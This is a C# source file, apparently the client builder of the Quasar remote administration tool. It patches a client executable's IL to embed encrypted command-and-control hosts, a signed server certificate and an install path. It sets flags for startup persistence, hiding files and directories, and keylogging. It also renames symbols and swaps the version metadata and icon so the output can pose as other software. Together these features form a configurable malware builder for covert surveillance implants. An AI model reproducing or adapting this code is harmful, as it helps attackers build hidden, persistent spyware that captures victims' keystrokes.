using Mono.Cecil;
using Mono.Cecil.Cil;
using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using Quasar.Server.Models;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Vestris.ResourceLib;

namespace Quasar.Server.Build
{
    /// <summary>
    /// Provides methods used to create a custom client executable.
    /// </summary>
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientFilePath;

        public ClientBuilder(BuildOptions options, string clientFilePath)
        {
            _options = options;
            _clientFilePath = clientFilePath;
        }

        /// <summary>
        /// Builds a client executable.
        /// </summary>
        public void Build()
        {
            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
            {
                // PHASE 1 - Writing settings
                WriteSettings(asmDef);

                // PHASE 2 - Renaming
                Renamer r = new Renamer(asmDef);

                if (!r.Perform())
                    throw new Exception("renaming failed");

                // PHASE 3 - Saving
                r.AsmDef.Write(_options.OutputPath);
            }

            // PHASE 4 - Assembly Information changing
            if (_options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(_options.OutputPath);

                versionResource.FileVersion = _options.AssemblyInformation[7];
                versionResource.ProductVersion = _options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];

                versionResource.SaveTo(_options.OutputPath);
            }

            // PHASE 5 - Icon changing
            if (!string.IsNullOrEmpty(_options.IconPath))
            {
                IconFile iconFile = new IconFile(_options.IconPath);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(_options.OutputPath);
            }
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            var key = StringHelper.GetRandomString(32);
            var aes = new Aes256(key);

            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!

            byte[] signature;
            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "Quasar.Client.Config.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                            break;
                                        case 3: //installsub
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
                                            break;
                                        case 4: //installname
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
                                            break;
                                        case 5: //mutex
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
                                            break;
                                        case 6: //startupkey
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
                                            break;
                                        case 7: //encryption key
                                            methodDef.Body.Instructions[i].Operand = key;
                                            break;
                                        case 8: //tag
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
                                            break;
                                        case 9: //LogDirectoryName
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                            break;
                                        case 10: //ServerSignature
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                            break;
                                        case 11: //ServerCertificate
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
                                            break;
                                        case 4: //Keylogger
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
                                            break;
                                        case 5: //HideLogDirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
                                            break;
                                        case 6: // HideInstallSubdirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
                                {
                                    //reconnectdelay
                                    methodDef.Body.Instructions[i].Operand = _options.Delay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(_options.InstallPath);
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Obtains the OpCode that corresponds to the bool value provided.
        /// </summary>
        /// <param name="p">The value to convert to the OpCode</param>
        /// <returns>Returns the OpCode that represents the value provided.</returns>
        private OpCode BoolOpCode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        /// <summary>
        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
        /// </summary>
        /// <param name="installpath">The integer value of the install path.</param>
        /// <returns>Returns the signed-byte value of the special folder.</returns>
        /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
        private sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFilesX86;
                case 3:
                    return (sbyte)Environment.SpecialFolder.SystemX86;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}